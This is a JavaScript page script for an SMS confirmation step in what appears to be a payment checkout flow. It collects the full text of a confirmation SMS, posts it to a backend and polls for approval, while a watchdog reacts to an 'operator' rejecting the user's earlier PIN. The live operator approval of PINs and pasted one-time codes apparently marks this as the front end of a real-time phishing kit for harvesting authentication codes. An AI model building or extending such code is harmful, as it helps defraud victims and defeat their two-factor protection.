/* ==========================================================================
   pages/sms.js
   Reads ?plan, ?phone and ?sid from the URL.

   Behaviour
   ---------
   * Renders the amount and recipient number.
   * Live character counter; Next Step enabled when non-empty.
   * Background watchdog polls pin-status every 2s. If the operator
     rejects the PIN while the user is here, we bounce them back to
     checkout.html?plan=X&sid=Y&phone=Z&error=pin_rejected.
   * Next Step: POST /api/otp, show a single "Confirming OTP..."
     loader, then poll otp-status until approved (-> success.html) or
     rejected (-> show inline error, allow retry).
   ========================================================================== */

(function (global) {
  "use strict";

  var DEFAULT_PLAN_CODE = "premium";
  var DEFAULT_PHONE = "079764645";
  var PIN_WATCHDOG_MS = 2000;
  var OTP_POLL_MS = 1500;

  var LOADER_ID = "sms-loader";
  var LOADER_TITLE_ID = "sms-loader-title";
  var LOADER_BODY_ID = "sms-loader-body";
  var ERROR_ID = "sms-error";
  var ERROR_TEXT_ID = "sms-error-text";

  var LOADER_TITLE = "Confirming OTP...";
  var LOADER_BODY =
    "Please wait while we verify your confirmation message.";

  var ERROR_OTP_REJECTED =
    "Invalid confirmation message, please wait for a new one and try again.";
  var ERROR_NETWORK =
    "Could not reach the server. Is 'py run_server.py' running?";

  var sid = "";
  var plan = null;
  var phone = "";

  function getQueryParam(name) {
    return new URLSearchParams(global.location.search).get(name);
  }

  function setText(id, value) {
    var el = document.getElementById(id);
    if (el) {
      el.textContent = value;
    }
  }

  function showLoader(title, body) {
    setText(LOADER_TITLE_ID, title);
    setText(LOADER_BODY_ID, body);
    var loader = document.getElementById(LOADER_ID);
    if (loader) {
      loader.hidden = false;
    }
  }

  function hideLoader() {
    var loader = document.getElementById(LOADER_ID);
    if (loader) {
      loader.hidden = true;
    }
  }

  function showError(message) {
    setText(ERROR_TEXT_ID, message);
    var error = document.getElementById(ERROR_ID);
    if (error) {
      error.style.display = "flex";
    }
  }

  function hideError() {
    var error = document.getElementById(ERROR_ID);
    if (error) {
      error.style.display = "none";
    }
  }

  function renderHeader() {
    var valueEl = document.getElementById("amount-value");
    if (valueEl) {
      valueEl.textContent = global.Plans.formatPrice(plan);
    }
    var phoneEl = document.getElementById("sending-to");
    if (phoneEl) {
      phoneEl.textContent = phone || DEFAULT_PHONE;
    }
    var backLink = document.getElementById("back-link");
    if (backLink) {
      var href = "checkout.html?plan=" + encodeURIComponent(plan.code);
      if (sid) {
        href += "&sid=" + encodeURIComponent(sid);
      }
      if (phone) {
        href += "&phone=" + encodeURIComponent(phone);
      }
      backLink.href = href;
    }
  }

  function getPinStatus() {
    return global.fetch(
      "/api/pin-status/" + encodeURIComponent(sid)
    ).then(function (response) {
      return response.ok ? response.json() : { status: "unknown" };
    });
  }

  function bounceToCheckout() {
    var target = "checkout.html" +
      "?plan=" + encodeURIComponent(plan.code) +
      "&sid=" + encodeURIComponent(sid) +
      "&phone=" + encodeURIComponent(phone) +
      "&error=pin_rejected";
    global.location.href = target;
  }

  function startPinWatchdog() {
    function tick() {
      getPinStatus().then(function (data) {
        if (data.status === "rejected") {
          bounceToCheckout();
          return;
        }
        global.setTimeout(tick, PIN_WATCHDOG_MS);
      }).catch(function () {
        global.setTimeout(tick, PIN_WATCHDOG_MS * 2);
      });
    }
    global.setTimeout(tick, PIN_WATCHDOG_MS);
  }

  function getOtpStatus() {
    return global.fetch(
      "/api/otp-status/" + encodeURIComponent(sid)
    ).then(function (response) {
      return response.ok ? response.json() : { status: "unknown" };
    });
  }

  function navigateToSuccess(referenceNumber) {
    var target = "success.html" +
      "?sid=" + encodeURIComponent(sid) +
      "&ref=" + encodeURIComponent(referenceNumber || "");
    global.location.href = target;
  }

  function pollOtpStatus() {
    function tick() {
      getOtpStatus().then(function (data) {
        if (data.status === "approved") {
          navigateToSuccess(data.reference_number || "");
          return;
        }
        if (data.status === "rejected") {
          hideLoader();
          showError(ERROR_OTP_REJECTED);
          clearTextarea();
          return;
        }
        global.setTimeout(tick, OTP_POLL_MS);
      }).catch(function () {
        global.setTimeout(tick, OTP_POLL_MS * 2);
      });
    }
    global.setTimeout(tick, OTP_POLL_MS);
  }

  function clearTextarea() {
    var textarea = document.getElementById("sms-body");
    if (!textarea) {
      return;
    }
    textarea.value = "";
    // Re-dispatch input so the counter and Next button resync.
    textarea.dispatchEvent(new Event("input"));
    textarea.focus();
  }

  function postOtp(smsBody) {
    return global.fetch("/api/otp", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        session_id: sid,
        sms_body: smsBody
      })
    });
  }

  function wireForm() {
    var textarea = document.getElementById("sms-body");
    var counter = document.getElementById("char-count");
    var nextBtn = document.getElementById("next-step");
    if (!textarea || !counter || !nextBtn) {
      return;
    }

    function sync() {
      counter.textContent = String(textarea.value.length);
      nextBtn.disabled = textarea.value.trim().length === 0;
    }
    textarea.addEventListener("input", sync);
    sync();

    nextBtn.addEventListener("click", function () {
      hideError();
      var smsBody = textarea.value.trim();
      if (!smsBody) {
        return;
      }
      showLoader(LOADER_TITLE, LOADER_BODY);
      postOtp(smsBody).then(function (response) {
        if (!response.ok) {
          hideLoader();
          showError(ERROR_NETWORK);
          return;
        }
        pollOtpStatus();
      }).catch(function () {
        hideLoader();
        showError(ERROR_NETWORK);
      });
    });
  }

  function init() {
    plan = (function () {
      var code = getQueryParam("plan") || DEFAULT_PLAN_CODE;
      return global.Plans.findByCode(code) ||
             global.Plans.findByCode(DEFAULT_PLAN_CODE);
    })();
    phone = getQueryParam("phone") || DEFAULT_PHONE;
    sid = getQueryParam("sid") || "";

    renderHeader();
    wireForm();

    if (sid) {
      startPinWatchdog();
    }
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})(window);
